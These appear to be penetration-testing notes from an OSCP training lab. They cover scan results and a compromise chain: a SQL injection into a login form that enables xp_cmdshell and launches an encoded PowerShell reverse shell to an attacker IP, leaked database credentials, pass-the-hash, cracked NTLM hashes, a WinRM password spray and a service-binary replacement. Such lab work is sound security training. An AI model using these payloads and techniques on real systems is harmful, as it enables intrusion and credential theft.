VPN, WEB01, WEB02
### Machine 1 - `.120`
Linux, port 22, port 80.

##### Port 80
WEBrick/1.6.1
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-title: PAW! (PWK Awesome Website)
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

```


### Machine 2 - `.121`
Windows, port 80, port 135, port 139,445, port 5985, port 47001
Port 80: MS IIS 10.0
```
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods:                                       
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                  
|_  Potentially risky methods: TRACE        
|_http-server-header: Microsoft-IIS/10.0                                                                            
|_http-title: MedTech
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125 
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found       
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found     
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC                                  
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC                           
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Device type: general purpose|firewall|storage-misc

```

Login page:
```
ctl00%24ContentPlaceHolder1%24UsernameTextBox='EXECUTE%20sp_configure%20'show%20advanced%20options',%201;RECONFIGURE;EXECUTE%20sp_configure%20'xp_cmdshell',%201;RECONFIGURE;EXECUTE%20xp_cmdshell%20'powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D';--
```

```
'EXECUTE%20sp_configure%20'show%20advanced%20options',%201;RECONFIGURE;EXECUTE%20sp_configure%20'xp_cmdshell',%201;RECONFIGURE;EXECUTE%20xp_cmdshell%20'SHELL_HERE';--
```
### Machine 3 - `.122`
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  openvpn?
```


### Internal network
```
─[✗]─[root@edu-virtualbox]─[/home/edu/OSCP/medtech]
└──╼ #while read -r line; do nxc smb "$line"; done < internal_hostlist 
SMB         172.16.186.83   445    CLIENT02         [*] Windows 10.0 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.186.82   445    CLIENT01         [*] Windows 10.0 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.186.13   445    PROD01           [*] Windows 10.0 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.186.12   445    DEV04            [*] Windows 10.0 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.186.11   445    FILES02          [*] Windows 10.0 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.186.10   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)

```


### .121 privesc
Found SEImpersonatePrivilege:
```

```

Found password of localhost\\SQLEXPRESS (`WhileChirpTuesday218`):
```
PS C:\Users\joe\Downloads\test> cat web.config
cat web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.web>
<!--            <customErrors mode="On">
                <error statusCode="500" redirect="error.aspx"/>
                        <error statusCode="404" redirect="error.aspx"/>
                </customErrors> -->
    <customErrors mode="RemoteOnly" />
                <compilation debug="true" targetFramework="4.0">
                        <assemblies>
                                <add assembly="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" />
                                <add assembly="System.DirectoryServices.AccountManagement, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089" />
                                <add assembly="System.DirectoryServices.Protocols, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" />
                        </assemblies>
                </compilation>
        </system.web>
        <system.webServer>
        <defaultDocument>
            <files>
                <clear />
                <add value="index.html" />
                <add value="index.htm" />
                <add value="default.aspx" />
            </files>
        </defaultDocument>
    </system.webServer>
        <connectionStrings>
                <add name="myConnectionString" connectionString="server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;" />
	        </connectionStrings>
</configuration>

```



Semi-interactive shell:
```
┌─[root@edu-virtualbox]─[/home/edu/OSCP/medtech]
└──╼ #impacket-wmiexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.186.121

```

```
joe:Flowers1 on .11
```

### .11 hashes found
```
PS C:\Users\joe\Documents> cat *.log | findstr /V "A handle to an object was requested...."
cat *.log | findstr /V "A handle to an object was requested...."
   88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
   88137 Oct 04 11:21  Backup      wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e                                                                                                                  
   87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436

abf36048c1cf88f5603381c5128feb8e
fdf36048c1cf88f5630381c5e38feb8e
8e9e1516818ce4e54247e71e71b5f436

fdf36048c1cf88f5630381c5e38feb8e:Mushroom! 

wario:Mushroom!

┌─[✗]─[root@edu-virtualbox]─[/home/edu/OSCP/medtech]
└──╼ #nxc winrm 172.16.163.0/24 -u wario -p Mushroom! 
WINRM       172.16.163.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:medtech.com)
WINRM       172.16.163.11   5985   FILES02          [*] Windows Server 2022 Build 20348 (name:FILES02) (domain:medtech.com)
WINRM       172.16.163.12   5985   DEV04            [*] Windows Server 2022 Build 20348 (name:DEV04) (domain:medtech.com)
WINRM       172.16.163.13   5985   PROD01           [*] Windows Server 2022 Build 20348 (name:PROD01) (domain:medtech.com)
WINRM       172.16.163.10   5985   DC01             [-] medtech.com\wario:Mushroom!
WINRM       172.16.163.11   5985   FILES02          [-] medtech.com\wario:Mushroom!
WINRM       172.16.163.83   5985   CLIENT02         [*] Windows 11 Build 22000 (name:CLIENT02) (domain:medtech.com)
WINRM       172.16.163.12   5985   DEV04            [-] medtech.com\wario:Mushroom!
WINRM       172.16.163.13   5985   PROD01           [-] medtech.com\wario:Mushroom!
WINRM       172.16.163.83   5985   CLIENT02         [+] medtech.com\wario:Mushroom! (Pwn3d!)
WINRM       172.16.163.254  5985   WEB02            [*] Windows Server 2022 Build 20348 (name:WEB02) (domain:medtech.com)
WINRM       172.16.163.254  5985   WEB02            [-] medtech.com\wario:Mushroom!
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```


Replaced the auditTracker.exe, and used
```
sc.exe start audittracker
```